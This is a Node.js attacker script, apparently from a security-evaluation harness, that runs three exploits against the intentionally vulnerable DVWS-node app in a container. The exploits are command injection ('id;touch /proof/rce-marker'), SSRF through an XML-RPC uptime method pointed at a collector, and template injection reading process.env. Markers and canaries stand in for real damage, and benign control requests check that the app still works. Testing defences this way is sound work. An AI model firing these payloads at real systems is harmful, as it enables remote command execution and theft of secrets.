// Attacker for the P3 arm: a real third-party application (DVWS-node).
//
// Effects are checked host-side: the RCE marker and the collector's hit log
// both live in a directory bind-mounted out of the container (/proof), so
// nothing here trusts the application's own HTTP response.
//
// Usage: node attacker-real.js <baseUrl> <out.jsonl>
// Env:   SHARED (host path bind-mounted at /proof), COLLECTOR_URL, CRED_USER,
//        CRED_PASS
'use strict';

const fs = require('fs');
const http = require('http');
const path = require('path');

const BASE_URL = (process.argv[2] || 'http://127.0.0.1:3280').replace(/\/$/, '');
const OUT = process.argv[3] || '/tmp/proof-real.jsonl';
const SHARED = process.env.SHARED || '/tmp/proof-shared';
const COLLECTOR_URL = process.env.COLLECTOR_URL || 'http://collector:3290/probe';
const CRED_USER = process.env.CRED_USER || 'admin';
const CRED_PASS = process.env.CRED_PASS || 'letmein';

const MARKER = path.join(SHARED, 'rce-marker');
const HITS = path.join(SHARED, 'hits.log');

const q = (s) => encodeURIComponent(s);

function request(method, urlPath, { body, headers, token } = {}) {
  return new Promise((resolve) => {
    const h = { ...(headers || {}) };
    if (token) h.Authorization = `Bearer ${token}`;
    if (body) {
      h['Content-Type'] = h['Content-Type'] || 'application/json';
      // Send a Content-Length rather than chunked encoding: a request-layer
      // filter that cannot read the body reports a body error and blocks,
      // which would be our bug, not its behaviour.
      h['Content-Length'] = Buffer.byteLength(body);
    }
    const req = http.request(BASE_URL + urlPath, { method, headers: h }, (res) => {
      let data = '';
      res.on('data', (c) => { data += c; });
      res.on('end', () => resolve({
        status: res.statusCode,
        body: data,
        waf: res.headers['x-proof-waf'] || '',
        wafRule: res.headers['x-proof-waf-rule'] || '',
        auth: res.headers.authorization || '',
      }));
    });
    req.on('error', (e) => resolve({ status: 0, body: String(e.message), waf: '', wafRule: '' }));
    req.setTimeout(5000, () => req.destroy(new Error('timeout')));
    if (body) req.write(body);
    req.end();
  });
}

function hits() {
  try {
    return fs.readFileSync(HITS, 'utf8').split('\n').filter(Boolean).length;
  } catch {
    return 0;
  }
}

async function login() {
  const res = await request('POST', '/api/v2/login', {
    body: JSON.stringify({ username: CRED_USER, password: CRED_PASS }),
  });
  let token = '';
  try {
    token = JSON.parse(res.body).token || '';
  } catch { /* not JSON */ }
  return { res, token };
}

async function run(name, requestDesc, fn) {
  const started = hits();
  let out;
  try {
    out = await fn();
  } catch (e) {
    out = { response: { status: 0, body: String(e.message) }, landed: false };
  }
  const response = out.response || out;
  return {
    scenario: name,
    request: requestDesc,
    status: response.status,
    waf: response.waf || '',
    wafRule: response.wafRule || '',
    landed: Boolean(out.landed),
    evidence: String(response.body || '').slice(0, 200),
    _hits: hits() - started,
  };
}

async function main() {
  try { fs.unlinkSync(MARKER); } catch { /* ignore */ }

  const results = [];

  // 1. The application's own control panel runs `exec(command + " -a")`.
  //    The marker is written through the bind mount so the host can see it.
  results.push(await run(
    'rce_exec',
    'GET /api/v2/sysinfo/id;<touch /proof/rce-marker> (authenticated)',
    async () => {
      const { token } = await login();
      if (!token) return { response: { status: 0, body: 'login failed' }, landed: false };
      const response = await request(
        'GET',
        `/api/v2/sysinfo/${q('id;touch /proof/rce-marker')}`,
        { token }
      );
      let landed = false;
      try { landed = fs.existsSync(MARKER); } catch { /* ignore */ }
      return { response, landed };
    }
  ));

  // 2. Unauthenticated XML-RPC method fetches a caller-supplied URL. The effect
  //    is the collector logging the callback, not the method's reply: the reply
  //    says "Checking uptime for X" whether or not the fetch ever happened.
  results.push(await run(
    'ssrf_uptime',
    `POST /xmlrpc dvws.CheckUptime -> ${COLLECTOR_URL}`,
    async () => {
      const xml = `<?xml version="1.0"?><methodCall><methodName>dvws.CheckUptime</methodName>`
        + `<params><param><value><string>${COLLECTOR_URL}</string></value></param></params></methodCall>`;
      const response = await request('POST', '/xmlrpc', {
        body: xml,
        headers: { 'Content-Type': 'text/xml' },
      });
      const before = hits();
      for (let i = 0; i < 20; i++) {
        if (hits() > before) break;
        await new Promise((r) => setTimeout(r, 150));
      }
      return { response, landed: hits() > before };
    }
  ));

  // 3. Unauthenticated template evaluation. The greeter compiles the query value
  //    into a template literal, so ${process.env.X} runs in-process. No process,
  //    file or network hook can observe that — which is exactly why it is here:
  //    it measures the edge of what runtime containment covers.
  const canary = process.env.SSTI_CANARY || 'SSTI-CANARY-NOT-REAL-7f3a';
  results.push(await run(
    'ssti_env',
    'GET /api/v2/greeter?name=${process.env.SSTI_CANARY} (unauthenticated)',
    async () => {
      const payload = '${process.env.SSTI_CANARY}';
      const response = await request('GET', `/api/v2/greeter?name=${encodeURIComponent(payload)}`);
      return { response, landed: String(response.body).includes(canary) };
    }
  ));

  // 4. Controls: the app must keep working under enforcement.
  results.push(await run('benign_login', `POST /api/v2/login ${CRED_USER}`, async () => {
    const { res, token } = await login();
    return { response: res, landed: res.status === 200 && Boolean(token) };
  }));
  results.push(await run('benign_info', 'GET /api/v1/info', async () => {
    const response = await request('GET', '/api/v1/info');
    return { response, landed: response.status === 200 && /"platform"/.test(response.body) };
  }));

  fs.writeFileSync(OUT, results.map((r) => JSON.stringify(r)).join('\n') + '\n');
  for (const r of results) {
    process.stdout.write(
      `${r.landed ? 'LANDED  ' : 'blocked '} ${r.scenario} (http ${r.status}${r._hits ? `, +${r._hits} collector hits` : ''})\n`
    );
  }
}

main().catch((e) => {
  process.stderr.write(`attacker error: ${e && e.stack ? e.stack : e}\n`);
  process.exit(1);
});
